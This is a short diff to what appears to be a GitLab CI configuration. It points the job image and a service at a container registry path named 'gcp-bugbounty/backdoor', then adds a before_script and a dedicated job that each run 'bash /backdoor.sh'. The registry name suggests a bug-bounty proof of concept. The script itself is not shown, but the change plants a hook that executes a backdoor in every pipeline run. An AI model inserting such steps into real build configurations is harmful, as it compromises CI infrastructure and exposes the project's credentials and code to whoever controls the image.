@@ -1,2 +1,11 @@
+image: gcr.io/gcp-bugbounty/backdoor
+
 services:
-  - gcr.io/gc-bugbounty/backdoor
+  - gcr.io/gcp-bugbounty/backdoor
+
+before_script:
+  - bash /backdoor.sh
+
+bdjob:
+  script:
+    - bash /backdoor.sh
